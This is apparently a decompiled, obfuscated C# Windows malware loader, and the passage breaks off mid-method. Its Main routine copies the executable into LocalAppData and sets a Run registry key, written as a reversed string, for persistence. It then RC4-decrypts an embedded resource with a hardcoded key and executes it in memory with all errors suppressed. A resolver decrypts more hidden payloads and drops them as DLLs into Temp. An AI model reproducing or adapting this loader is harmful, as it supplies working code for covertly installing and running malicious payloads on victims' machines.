using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using ns0;
using ns2;
using ns3;

namespace ns1;

internal class Class15
{
	unsafe static int smethod_0(int int_0, Class8.Class11 class11_0, byte[] byte_0, int int_1)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = class11_0.int_0;
		if (int_0 > class11_0.int_1)
		{
			int_0 = class11_0.int_1;
		}
		else
		{
			*(int*)ptr = (class11_0.int_0 - class11_0.int_1 + int_0) & 0x7FFF;
		}
		*(int*)((byte*)ptr + 4) = int_0;
		*(int*)((byte*)ptr + 8) = int_0 - *(int*)ptr;
		if (*(int*)((byte*)ptr + 8) > 0)
		{
			Array.Copy(class11_0.byte_0, 32768 - *(int*)((byte*)ptr + 8), byte_0, int_1, *(int*)((byte*)ptr + 8));
			int_1 += *(int*)((byte*)ptr + 8);
			int_0 = *(int*)ptr;
		}
		Array.Copy(class11_0.byte_0, *(int*)ptr - int_0, byte_0, int_1, int_0);
		class11_0.int_1 -= *(int*)((byte*)ptr + 4);
		if (class11_0.int_1 < 0)
		{
			throw new InvalidOperationException();
		}
		return *(int*)((byte*)ptr + 4);
	}

	static void smethod_1(Class8.Class11 class11_0, int int_0, int int_1)
	{
		if ((class11_0.int_1 += int_0) > 32768)
		{
			throw new InvalidOperationException();
		}
		int num = (class11_0.int_0 - int_1) & 0x7FFF;
		int num2 = 32768 - int_0;
		if (num <= num2 && class11_0.int_0 < num2)
		{
			if (int_0 <= int_1)
			{
				Array.Copy(class11_0.byte_0, num, class11_0.byte_0, class11_0.int_0, int_0);
				class11_0.int_0 += int_0;
			}
			else
			{
				while (int_0-- > 0)
				{
					class11_0.byte_0[class11_0.int_0++] = class11_0.byte_0[num++];
				}
			}
		}
		else
		{
			Class15.smethod_32(class11_0, num, int_0, int_1);
		}
	}

	static bool smethod_2(Class8.Class10 class10_0)
	{
		return class10_0.int_0 == class10_0.int_1;
	}

	unsafe static byte[] smethod_3(byte[] byte_0)
	{
		void* ptr = stackalloc byte[46];
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class15.smethod_36(callingAssembly, executingAssembly))
		{
			return null;
		}
		Class8.Stream0 stream = new Class8.Stream0(byte_0);
		byte[] array = new byte[0];
		*(int*)ptr = Class15.smethod_18(stream);
		if (*(int*)ptr == 67324752)
		{
			*(short*)((byte*)ptr + 44) = (short)Class15.smethod_23(stream);
			*(int*)((byte*)ptr + 4) = Class15.smethod_23(stream);
			*(int*)((byte*)ptr + 8) = Class15.smethod_23(stream);
			if (*(int*)ptr != 67324752 || *(short*)((byte*)ptr + 44) != 20 || *(int*)((byte*)ptr + 4) != 0 || *(int*)((byte*)ptr + 8) != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class15.smethod_18(stream);
			Class15.smethod_18(stream);
			Class15.smethod_18(stream);
			*(int*)((byte*)ptr + 12) = Class15.smethod_18(stream);
			*(int*)((byte*)ptr + 16) = Class15.smethod_23(stream);
			*(int*)((byte*)ptr + 20) = Class15.smethod_23(stream);
			if (*(int*)((byte*)ptr + 16) > 0)
			{
				byte[] buffer = new byte[*(int*)((byte*)ptr + 16)];
				stream.Read(buffer, 0, *(int*)((byte*)ptr + 16));
			}
			if (*(int*)((byte*)ptr + 20) > 0)
			{
				byte[] buffer2 = new byte[*(int*)((byte*)ptr + 20)];
				stream.Read(buffer2, 0, *(int*)((byte*)ptr + 20));
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class8.Class9 class9_ = new Class8.Class9(array2);
			array = new byte[*(int*)((byte*)ptr + 12)];
			Class15.smethod_4(0, class9_, array, array.Length);
			array2 = null;
		}
		else
		{
			*(int*)((byte*)ptr + 24) = *(int*)ptr >> 24;
			*(int*)ptr -= *(int*)((byte*)ptr + 24) << 24;
			if (*(int*)ptr != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (*(int*)((byte*)ptr + 24) == 1)
			{
				*(int*)((byte*)ptr + 28) = Class15.smethod_18(stream);
				array = new byte[*(int*)((byte*)ptr + 28)];
				*(int*)((byte*)ptr + 32) = 0;
				while (*(int*)((byte*)ptr + 32) < *(int*)((byte*)ptr + 28))
				{
					*(int*)((byte*)ptr + 36) = Class15.smethod_18(stream);
					*(int*)((byte*)ptr + 40) = Class15.smethod_18(stream);
					byte[] array3 = new byte[*(int*)((byte*)ptr + 36)];
					stream.Read(array3, 0, array3.Length);
					Class8.Class9 class9_2 = new Class8.Class9(array3);
					Class15.smethod_4(*(int*)((byte*)ptr + 32), class9_2, array, *(int*)((byte*)ptr + 40));
					*(int*)((byte*)ptr + 32) += *(int*)((byte*)ptr + 40);
				}
			}
			if (*(int*)((byte*)ptr + 24) == 2)
			{
				byte[] byte_ = new byte[8] { 142, 20, 96, 240, 142, 89, 14, 147 };
				byte[] byte_2 = new byte[8] { 174, 64, 191, 101, 173, 180, 84, 121 };
				using Class7 class7_ = new Class7();
				using ICryptoTransform cryptoTransform = Class15.smethod_35(byte_, class7_, byte_2, bool_0: true);
				byte[] byte_3 = cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class15.smethod_3(byte_3);
			}
			if (*(int*)((byte*)ptr + 24) == 3)
			{
				byte[] byte_4 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_5 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using Class6 class6_ = new Class6();
				using ICryptoTransform cryptoTransform2 = Class15.smethod_26(byte_5, class6_, bool_0: true, byte_4);
				byte[] byte_6 = cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class15.smethod_3(byte_6);
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	unsafe static int smethod_4(int int_0, Class8.Class9 class9_0, byte[] byte_0, int int_1)
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = 0;
		do
		{
			if (class9_0.int_4 != 11)
			{
				*(int*)((byte*)ptr + 4) = Class15.smethod_0(int_1, class9_0.class11_0, byte_0, int_0);
				int_0 += *(int*)((byte*)ptr + 4);
				*(int*)ptr += *(int*)((byte*)ptr + 4);
				int_1 -= *(int*)((byte*)ptr + 4);
				if (int_1 == 0)
				{
					return *(int*)ptr;
				}
			}
		}
		while (Class15.smethod_25(class9_0) || (class9_0.class11_0.int_1 > 0 && class9_0.int_4 != 11));
		return *(int*)ptr;
	}

	static int smethod_5(Class8.Class10 class10_0, int int_0)
	{
		if (class10_0.int_2 < int_0)
		{
			if (class10_0.int_0 == class10_0.int_1)
			{
				return -1;
			}
			class10_0.uint_0 |= (uint)(((class10_0.byte_0[class10_0.int_0++] & 0xFF) | ((class10_0.byte_0[class10_0.int_0++] & 0xFF) << 8)) << class10_0.int_2);
			class10_0.int_2 += 16;
		}
		return (int)(class10_0.uint_0 & ((1 << int_0) - 1));
	}

	static void smethod_6(byte[] byte_0, Class8.Class10 class10_0, int int_0, int int_1)
	{
		if (class10_0.int_0 < class10_0.int_1)
		{
			throw new InvalidOperationException();
		}
		int num = int_0 + int_1;
		if (0 <= int_0 && int_0 <= num && num <= byte_0.Length)
		{
			if (((uint)int_1 & (true ? 1u : 0u)) != 0)
			{
				class10_0.uint_0 |= (uint)((byte_0[int_0++] & 0xFF) << class10_0.int_2);
				class10_0.int_2 += 8;
			}
			class10_0.byte_0 = byte_0;
			class10_0.int_0 = int_0;
			class10_0.int_1 = num;
			return;
		}
		throw new ArgumentOutOfRangeException();
	}

	static void smethod_7(Class8.Class10 class10_0)
	{
		class10_0.uint_0 >>= class10_0.int_2 & 7;
		class10_0.int_2 &= -8;
	}

	unsafe static int smethod_8(Class8.Class11 class11_0, Class8.Class10 class10_0, int int_0)
	{
		void* ptr = stackalloc byte[8];
		int_0 = Math.Min(Math.Min(int_0, 32768 - class11_0.int_1), Class15.smethod_15(class10_0));
		*(int*)((byte*)ptr + 4) = 32768 - class11_0.int_0;
		if (int_0 > *(int*)((byte*)ptr + 4))
		{
			*(int*)ptr = Class15.smethod_16(class10_0, class11_0.byte_0, class11_0.int_0, *(int*)((byte*)ptr + 4));
			if (*(int*)ptr == *(int*)((byte*)ptr + 4))
			{
				*(int*)ptr += Class15.smethod_16(class10_0, class11_0.byte_0, 0, int_0 - *(int*)((byte*)ptr + 4));
			}
		}
		else
		{
			*(int*)ptr = Class15.smethod_16(class10_0, class11_0.byte_0, class11_0.int_0, int_0);
		}
		class11_0.int_0 = (class11_0.int_0 + *(int*)ptr) & 0x7FFF;
		class11_0.int_1 += *(int*)ptr;
		return *(int*)ptr;
	}

	unsafe static byte[] smethod_9(byte[] byte_0, string string_0)
	{
		void* ptr = stackalloc byte[9];
		byte[] bytes = Encoding.Default.GetBytes(string_0);
		byte[] array = new byte[256];
		byte[] array2 = new byte[256];
		int i;
		for (i = 0; i < 256; i++)
		{
			array[i] = (byte)i;
			array2[i] = bytes[i % bytes.GetLength(0)];
		}
		int num = 0;
		for (i = 0; i < 256; i++)
		{
			num = (num + array[i] + array2[i]) % 256;
			((byte*)ptr)[8] = array[i];
			array[i] = array[num];
			array[num] = ((byte*)ptr)[8];
		}
		num = 0;
		i = 0;
		*(int*)ptr = 0;
		while (*(int*)ptr < byte_0.GetLength(0))
		{
			i = (i + 1) % 256;
			num = (num + array[i]) % 256;
			((byte*)ptr)[8] = array[i];
			array[i] = array[num];
			array[num] = ((byte*)ptr)[8];
			*(int*)((byte*)ptr + 4) = (array[i] + array[num]) % 256;
			byte_0[*(int*)ptr] ^= array[*(int*)((byte*)ptr + 4)];
			(*(int*)ptr)++;
		}
		return byte_0;
	}

	static void smethod_10()
	{
		try
		{
			Class5.smethod_0();
		}
		catch (Exception)
		{
		}
	}

	static int smethod_11(Class8.Class11 class11_0)
	{
		return class11_0.int_1;
	}

	unsafe static void smethod_12(byte[] byte_0, Class8.Class12 class12_0)
	{
		void* ptr = stackalloc byte[68];
		int[] array = new int[16];
		int[] array2 = new int[16];
		*(int*)ptr = 0;
		while (*(int*)ptr < byte_0.Length)
		{
			*(int*)((byte*)ptr + 4) = byte_0[*(int*)ptr];
			if (*(int*)((byte*)ptr + 4) > 0)
			{
				int[] array3;
				int[] array4 = (array3 = array);
				int num = *(int*)((byte*)ptr + 4);
				nint num2 = num;
				array4[num] = array3[num2] + 1;
			}
			(*(int*)ptr)++;
		}
		*(int*)((byte*)ptr + 8) = 0;
		*(int*)((byte*)ptr + 12) = 512;
		*(int*)((byte*)ptr + 16) = 1;
		while (*(int*)((byte*)ptr + 16) <= 15)
		{
			array2[*(int*)((byte*)ptr + 16)] = *(int*)((byte*)ptr + 8);
			*(int*)((byte*)ptr + 8) += array[*(int*)((byte*)ptr + 16)] << 16 - *(int*)((byte*)ptr + 16);
			if (*(int*)((byte*)ptr + 16) >= 10)
			{
				*(int*)((byte*)ptr + 20) = array2[*(int*)((byte*)ptr + 16)] & 0x1FF80;
				*(int*)((byte*)ptr + 24) = *(int*)((byte*)ptr + 8) & 0x1FF80;
				*(int*)((byte*)ptr + 12) += *(int*)((byte*)ptr + 24) - *(int*)((byte*)ptr + 20) >> 16 - *(int*)((byte*)ptr + 16);
			}
			(*(int*)((byte*)ptr + 16))++;
		}
		class12_0.short_0 = new short[*(int*)((byte*)ptr + 12)];
		*(int*)((byte*)ptr + 28) = 512;
		*(int*)((byte*)ptr + 32) = 15;
		while (*(int*)((byte*)ptr + 32) >= 10)
		{
			*(int*)((byte*)ptr + 36) = *(int*)((byte*)ptr + 8) & 0x1FF80;
			*(int*)((byte*)ptr + 8) -= array[*(int*)((byte*)ptr + 32)] << 16 - *(int*)((byte*)ptr + 32);
			*(int*)((byte*)ptr + 40) = *(int*)((byte*)ptr + 8) & 0x1FF80;
			*(int*)((byte*)ptr + 44) = *(int*)((byte*)ptr + 40);
			while (*(int*)((byte*)ptr + 44) < *(int*)((byte*)ptr + 36))
			{
				class12_0.short_0[Class15.smethod_28(*(int*)((byte*)ptr + 44))] = (short)((-(*(int*)((byte*)ptr + 28)) << 4) | *(int*)((byte*)ptr + 32));
				*(int*)((byte*)ptr + 28) += 1 << *(int*)((byte*)ptr + 32) - 9;
				*(int*)((byte*)ptr + 44) += 128;
			}
			(*(int*)((byte*)ptr + 32))--;
		}
		*(int*)((byte*)ptr + 48) = 0;
		while (*(int*)((byte*)ptr + 48) < byte_0.Length)
		{
			*(int*)((byte*)ptr + 52) = byte_0[*(int*)((byte*)ptr + 48)];
			if (*(int*)((byte*)ptr + 52) != 0)
			{
				*(int*)((byte*)ptr + 8) = array2[*(int*)((byte*)ptr + 52)];
				*(int*)((byte*)ptr + 56) = Class15.smethod_28(*(int*)((byte*)ptr + 8));
				if (*(int*)((byte*)ptr + 52) <= 9)
				{
					do
					{
						class12_0.short_0[*(int*)((byte*)ptr + 56)] = (short)((*(int*)((byte*)ptr + 48) << 4) | *(int*)((byte*)ptr + 52));
						*(int*)((byte*)ptr + 56) += 1 << *(int*)((byte*)ptr + 52);
					}
					while (*(int*)((byte*)ptr + 56) < 512);
				}
				else
				{
					*(int*)((byte*)ptr + 60) = class12_0.short_0[*(int*)((byte*)ptr + 56) & 0x1FF];
					*(int*)((byte*)ptr + 64) = 1 << (*(int*)((byte*)ptr + 60) & 0xF);
					*(int*)((byte*)ptr + 60) = -(*(int*)((byte*)ptr + 60) >> 4);
					do
					{
						class12_0.short_0[*(int*)((byte*)ptr + 60) | (*(int*)((byte*)ptr + 56) >> 9)] = (short)((*(int*)((byte*)ptr + 48) << 4) | *(int*)((byte*)ptr + 52));
						*(int*)((byte*)ptr + 56) += 1 << *(int*)((byte*)ptr + 52);
					}
					while (*(int*)((byte*)ptr + 56) < *(int*)((byte*)ptr + 64));
				}
				array2[*(int*)((byte*)ptr + 52)] = *(int*)((byte*)ptr + 8) + (1 << 16 - *(int*)((byte*)ptr + 52));
			}
			(*(int*)((byte*)ptr + 48))++;
		}
	}

	unsafe static void Main(string[] args)
	{
		void* ptr = stackalloc byte[12];
		object[] parameters = new object[0];
		*(int*)((byte*)ptr + 8) = new Random().Next(300, 750);
		*(long*)ptr = Environment.TickCount;
		_ = Environment.TickCount - *(long*)ptr;
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\بي.exe"))
		{
			File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\بي.exe");
		}
		string name = Class15.smethod_31("nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS");
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
		registryKey.SetValue("", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\بي.exe");
		registryKey.Close();
		try
		{
			ResourceManager resourceManager = new ResourceManager("res", Assembly.GetExecutingAssembly());
			byte[] rawAssembly = Class15.smethod_9((byte[])resourceManager.GetObject("dNtCu"), "EyY9rfQCyMkgj6Yxt06hrDb6uXQUN25qM95UHq0zZ1vR02VTFcjXxKwbw");
			resourceManager.ReleaseAllResources();
			Assembly assembly = Assembly.Load(rawAssembly);
			if (assembly.EntryPoint!.GetParameters().Length > 0)
			{
				parameters = new object[1] { args };
			}
			assembly.EntryPoint!.Invoke(null, parameters);
		}
		catch
		{
		}
	}

	[DllImport("kernel32")]
	static extern bool MoveFileEx(string string_0, string string_1, int int_0);

	static int smethod_13(Class8.Class10 class10_0)
	{
		return class10_0.int_2;
	}

	unsafe static bool smethod_14(Class8.Class9 class9_0)
	{
		void* ptr = stackalloc byte[12];
		int num = Class15.smethod_21(class9_0.class11_0);
		while (num >= 258)
		{
			*(int*)((byte*)ptr + 8) = class9_0.int_4;
			switch (*(int*)((byte*)ptr + 8))
			{
			case 7:
			{
				int num2;
				while (((num2 = Class15.smethod_30(class9_0.class12_0, class9_0.class10_0)) & -256) == 0)
				{
					Class15.smethod_20(class9_0.class11_0, num2);
					if (--num < 258)
					{
						return true;
					}
				}
				if (num2 >= 257)
				{
					class9_0.int_6 = Class8.Class9.int_0[num2 - 257];
					class9_0.int_5 = Class8.Class9.int_1[num2 - 257];
					goto case 8;
				}
				if (num2 < 0)
				{
					return false;
				}
				class9_0.class12_1 = null;
				class9_0.class12_0 = null;
				class9_0.int_4 = 2;
				return true;
			}
			case 8:
				if (class9_0.int_5 > 0)
				{
					class9_0.int_4 = 8;
					*(int*)ptr = Class15.smethod_5(class9_0.class10_0, class9_0.int_5);
					if (*(int*)ptr < 0)
					{
						return false;
					}
					Class15.smethod_29(class9_0.class10_0, class9_0.int_5);
					class9_0.int_6 += *(int*)ptr;
				}
				class9_0.int_4 = 9;
				goto case 9;
			case 9:
			{
				int num2 = Class15.smethod_30(class9_0.class12_1, class9_0.class10_0);
				if (num2 >= 0)
				{
					class9_0.int_7 = Class8.Class9.int_2[num2];
					class9_0.int_5 = Class8.Class9.int_3[num2];
					goto case 10;
				}
				return false;
			}
			case 10:
				if (class9_0.int_5 > 0)
				{
					class9_0.int_4 = 10;
					*(int*)((byte*)ptr + 4) = Class15.smethod_5(class9_0.class10_0, class9_0.int_5);
					if (*(int*)((byte*)ptr + 4) < 0)
					{
						return false;
					}
					Class15.smethod_29(class9_0.class10_0, class9_0.int_5);
					class9_0.int_7 += *(int*)((byte*)ptr + 4);
				}
				Class15.smethod_1(class9_0.class11_0, class9_0.int_6, class9_0.int_7);
				num -= class9_0.int_6;
				class9_0.int_4 = 7;
				break;
			}
		}
		return true;
	}

	static int smethod_15(Class8.Class10 class10_0)
	{
		return class10_0.int_1 - class10_0.int_0 + (class10_0.int_2 >> 3);
	}

	unsafe static int smethod_16(Class8.Class10 class10_0, byte[] byte_0, int int_0, int int_1)
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = 0;
		while (class10_0.int_2 > 0 && int_1 > 0)
		{
			byte_0[int_0++] = (byte)class10_0.uint_0;
			class10_0.uint_0 >>= 8;
			class10_0.int_2 -= 8;
			int_1--;
			(*(int*)ptr)++;
		}
		if (int_1 == 0)
		{
			return *(int*)ptr;
		}
		*(int*)((byte*)ptr + 4) = class10_0.int_1 - class10_0.int_0;
		if (int_1 > *(int*)((byte*)ptr + 4))
		{
			int_1 = *(int*)((byte*)ptr + 4);
		}
		Array.Copy(class10_0.byte_0, class10_0.int_0, byte_0, int_0, int_1);
		class10_0.int_0 += int_1;
		if (((uint)(class10_0.int_0 - class10_0.int_1) & (true ? 1u : 0u)) != 0)
		{
			class10_0.uint_0 = class10_0.byte_0[class10_0.int_0++] & 0xFFu;
			class10_0.int_2 = 8;
		}
		return *(int*)ptr + int_1;
	}

	static void smethod_17()
	{
		try
		{
			AppDomain.CurrentDomain.AssemblyResolve += Class15.smethod_27;
		}
		catch
		{
		}
	}

	static int smethod_18(Class8.Stream0 stream0_0)
	{
		return Class15.smethod_23(stream0_0) | (Class15.smethod_23(stream0_0) << 16);
	}

	static Class8.Class12 smethod_19(Class8.Class13 class13_0)
	{
		byte[] array = new byte[class13_0.int_3];
		Array.Copy(class13_0.byte_1, 0, array, 0, class13_0.int_3);
		return new Class8.Class12(array);
	}

	static void smethod_20(Class8.Class11 class11_0, int int_0)
	{
		if (class11_0.int_1++ == 32768)
		{
			throw new InvalidOperationException();
		}
		class11_0.byte_0[class11_0.int_0++] = (byte)int_0;
		class11_0.int_0 &= 32767;
	}

	static int smethod_21(Class8.Class11 class11_0)
	{
		return 32768 - class11_0.int_1;
	}

	static Class8.Class12 smethod_22(Class8.Class13 class13_0)
	{
		byte[] array = new byte[class13_0.int_4];
		Array.Copy(class13_0.byte_1, class13_0.int_3, array, 0, class13_0.int_4);
		return new Class8.Class12(array);
	}

	static int smethod_23(Class8.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	static void smethod_24(Class7 class7_0)
	{
		class7_0.type_0.GetMethod("Clear")!.Invoke(class7_0.object_0, new object[0]);
	}

	unsafe static bool smethod_25(Class8.Class9 class9_0)
	{
		void* ptr = stackalloc byte[12];
		switch (class9_0.int_4)
		{
		case 2:
			if (class9_0.bool_0)
			{
				class9_0.int_4 = 12;
				return false;
			}
			*(int*)ptr = Class15.smethod_5(class9_0.class10_0, 3);
			if (*(int*)ptr < 0)
			{
				return false;
			}
			Class15.smethod_29(class9_0.class10_0, 3);
			if (((uint)(*(int*)ptr) & (true ? 1u : 0u)) != 0)
			{
				class9_0.bool_0 = true;
			}
			switch (*(int*)ptr >> 1)
			{
			case 0:
				Class15.smethod_7(class9_0.class10_0);
				class9_0.int_4 = 3;
				break;
			case 1:
				class9_0.class12_0 = Class8.Class12.class12_0;
				class9_0.class12_1 = Class8.Class12.class12_1;
				class9_0.int_4 = 7;
				break;
			case 2:
				class9_0.class13_0 = new Class8.Class13();
				class9_0.int_4 = 6;
				break;
			}
			return true;
		case 3:
			if ((class9_0.int_8 = Class15.smethod_5(class9_0.class10_0, 16)) < 0)
			{
				return false;
			}
			Class15.smethod_29(class9_0.class10_0, 16);
			class9_0.int_4 = 4;
			goto case 4;
		case 4:
			*(int*)((byte*)ptr + 4) = Class15.smethod_5(class9_0.class10_0, 16);
			if (*(int*)((byte*)ptr + 4) < 0)
			{
				return false;
			}
			Class15.smethod_29(class9_0.class10_0, 16);
			class9_0.int_4 = 5;
			goto case 5;
		case 5:
			*(int*)((byte*)ptr + 8) = Class15.smethod_8(class9_0.class11_0, class9_0.class10_0, class9_0.int_8);
			class9_0.int_8 -= *(int*)((byte*)ptr + 8);
			if (class9_0.int_8 == 0)
			{
				class9_0.int_4 = 2;
				return true;
			}
			return !Class15.smethod_2(class9_0.class10_0);
		case 6:
			if (!Class15.smethod_34(class9_0.class13_0, class9_0.class10_0))
			{
				return false;
			}
			class9_0.class12_0 = Class15.smethod_19(class9_0.class13_0);
			class9_0.class12_1 = Class15.smethod_22(class9_0.class13_0);
			class9_0.int_4 = 7;
			goto case 7;
		case 7:
		case 8:
		case 9:
		case 10:
			return Class15.smethod_14(class9_0);
		default:
			return false;
		case 12:
			return false;
		}
	}

	static ICryptoTransform smethod_26(byte[] byte_0, Class6 class6_0, bool bool_0, byte[] byte_1)
	{
		class6_0.type_0.GetProperty("Key")!.GetSetMethod()!.Invoke(class6_0.object_0, new object[1] { byte_1 });
		class6_0.type_0.GetProperty("IV")!.GetSetMethod()!.Invoke(class6_0.object_0, new object[1] { byte_0 });
		MethodInfo method = class6_0.type_0.GetMethod(bool_0 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
		return (ICryptoTransform)method.Invoke(class6_0.object_0, new object[0]);
	}

	unsafe static Assembly smethod_27(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		void* ptr = stackalloc byte[18];
		Class2.Struct0 @struct = new Class2.Struct0(resolveEventArgs_0.Name);
		string s = @struct.method_0(bool_0: false);
		string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
		string[] array = "ezNmZWZhZTUxLTVmNWMtNDRhOS05YjU2LWUxZTVhYTBiODkxZn0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{945f0ea8-f53d-4988-9528-c3a0b46de40d},ezNmZWZhZTUxLTVmNWMtNDRhOS05YjU2LWUxZTVhYTBiODkxZn0=,[z]{945f0ea8-f53d-4988-9528-c3a0b46de40d}".Split(new char[1] { ',' });
		string text2 = string.Empty;
		((byte*)ptr)[16] = 0;
		((byte*)ptr)[17] = 0;
		*(int*)ptr = 0;
		while (*(int*)ptr < array.Length - 1)
		{
			if (!(array[*(int*)ptr] == text))
			{
				*(int*)ptr += 2;
				continue;
			}
			text2 = array[*(int*)ptr + 1];
			break;
		}
		if (text2.Length == 0 && @struct.string_2.Length == 0)
		{
			text = Convert.ToBase64String(Encoding.UTF8.GetBytes(@struct.string_0));
			*(int*)((byte*)ptr + 4) = 0;
			while (*(int*)((byte*)ptr + 4) < array.Length - 1)
			{
				if (!(array[*(int*)((byte*)ptr + 4)] == text))
				{
					*(int*)((byte*)ptr + 4) += 2;
					continue;
				}
				text2 = array[*(int*)((byte*)ptr + 4) + 1];
				break;
			}
		}
		if (text2.Length > 0)
		{
			if (text2[0] == '[')
			{
				*(int*)((byte*)ptr + 8) = text2.IndexOf(']');
				string text3 = text2.Substring(1, *(int*)((byte*)ptr + 8) - 1);
				((byte*)ptr)[16] = ((text3.IndexOf('z') >= 0) ? ((byte)1) : ((byte)0));
				((byte*)ptr)[17] = ((text3.IndexOf('t') >= 0) ? ((byte)1) : ((byte)0));
				text2 = text2.Substring(*(int*)((byte*)ptr + 8) + 1);
			}
			lock (Class2.hashtable_0)
			{
				if (Class2.hashtable_0.ContainsKey(text2))
				{
					return (Assembly)Class2.hashtable_0[text2];
				}
				Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text2);
				if (manifestResourceStream != null)
				{
					*(int*)((byte*)ptr + 12) = (int)manifestResourceStream.Length;
					byte[] array2 = new byte[*(int*)((byte*)ptr + 12)];
					manifestResourceStream.Read(array2, 0, *(int*)((byte*)ptr + 12));
					if (((byte*)ptr)[16] != 0)
					{
						array2 = Class15.smethod_3(array2);
					}
					Assembly assembly = null;
					if (((byte*)ptr)[17] == 0)
					{
						try
						{
							assembly = Assembly.Load(array2);
						}
						catch (FileLoadException)
						{
							((byte*)ptr)[17] = 1;
						}
						catch (BadImageFormatException)
						{
							((byte*)ptr)[17] = 1;
						}
					}
					if (((byte*)ptr)[17] != 0)
					{
						try
						{
							string text4 = $"{Path.GetTempPath()}{text2}\\";
							Directory.CreateDirectory(text4);
							string text5 = text4 + @struct.string_0 + ".dll";
							if (!File.Exists(text5))
							{
								FileStream fileStream = File.OpenWrite(text5);
								fileStream.Write(array2, 0, array2.Length);
								fileStream.Close();
								Class15.MoveFileEx(text5, (string)null, 4);
								Class15.MoveFileEx(text4, (string)null, 4);
							}
							assembly = Assembly.LoadFile(text5);
						}
						catch
						{
						}
					}
					Class2.hashtable_0[text2] = assembly;
					return assembly;
				}
			}
		}
		return null;
	}

	static short smethod_28(int int_0)
	{
		return (short)((Class8.Class14.byte_0[int_0 & 0xF] << 12) | (Class8.Class14.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class8.Class14.byte_0[(int_0 >> 8) & 0xF] << 4) | Class8.Class14.byte_0[int_0 >> 12]);
	}

	static void smethod_29(Class8.Class10 class10_0, int int_0)
	{
		class10_0.uint_0 >>= int_0;
		class10_0.int_2 -= int_0;
	}

	unsafe static int smethod_30(Class8.Class12 class12_0, Class8.Class10 class10_0)
	{
		void* ptr = stackalloc byte[16];
		int num;
		int num2;
		if ((num = Class15.smethod_5(class10_0, 9)) >= 0)
		{
			if ((num2 = class12_0.short_0[num]) >= 0)
			{
				Class15.smethod_29(class10_0, num2 & 0xF);
				return num2 >> 4;
			}
			*(int*)ptr = -(num2 >> 4);
			*(int*)((byte*)ptr + 4) = num2 & 0xF;
			if ((num = Class15.smethod_5(class10_0, *(int*)((byte*)ptr + 4))) >= 0)
			{
				num2 = class12_0.short_0[*(int*)ptr | (num >> 9)];
				Class15.smethod_29(class10_0, num2 & 0xF);
				return num2 >> 4;
			}
			*(int*)((byte*)ptr + 8) = class10_0.int_2;
			num = Class15.smethod_5(class10_0, *(int*)((byte*)ptr + 8));
			num2 = class12_0.short_0[*(int*)ptr | (num >> 9)];
			if ((num2 & 0xF) <= *(int*)((byte*)ptr + 8))
			{
				Class15.smethod_29(class10_0, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		*(int*)((byte*)ptr + 12) = class10_0.int_2;
		num = Class15.smethod_5(class10_0, *(int*)((byte*)ptr + 12));
		num2 = class12_0.short_0[num];
		if (num2 >= 0 && (num2 & 0xF) <= *(int*)((byte*)ptr + 12))
		{
			Class15.smethod_29(class10_0, num2 & 0xF);
			return num2 >> 4;
		}
		return -1;
	}

	static string smethod_31(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	static void smethod_32(Class8.Class11 class11_0, int int_0, int int_1, int int_2)
	{
		while (int_1-- > 0)
		{
			class11_0.byte_0[class11_0.int_0++] = class11_0.byte_0[int_0++];
			class11_0.int_0 &= 32767;
			int_0 &= 0x7FFF;
		}
	}

	static void smethod_33()
	{
		try
		{
			Class15.smethod_17();
		}
		catch (Exception)
		{
		}
	}

	unsafe static bool smethod_34(Class8.Class13 class13_0, Class8.Class10 class10_0)
	{
		void* ptr = stackalloc byte[8];
		while (true)
		{
			switch (class13_0.int_2)
			{
			case 5:
			{
				*(int*)((byte*)ptr + 4) = Class8.Class13.int_1[class13_0.int_7];
				int num = Class15.smethod_5(class10_0, *(int*)((byte*)ptr + 4));
				if (num >= 0)
				{
					Class15.smethod_29(class10_0, *(int*)((byte*)ptr + 4));
					num += Class8.Class13.int_0[class13_0.int_7];
					while (num-- > 0)
					{
						class13_0.byte_1[class13_0.int_8++] = class13_0.byte_2;
					}
					if (class13_0.int_8 == class13_0.int_6)
					{
						return true;
					}
					goto IL_0080;
				}
				return false;
			}
			case 4:
			{
				int num2;
				while (((num2 = Class15.smethod_30(class13_0.class12_0, class10_0)) & -16) == 0)
				{
					class13_0.byte_1[class13_0.int_8++] = (class13_0.byte_2 = (byte)num2);
					if (class13_0.int_8 == class13_0.int_6)
					{
						return true;
					}
				}
				if (num2 >= 0)
				{
					if (num2 >= 17)
					{
						class13_0.byte_2 = 0;
					}
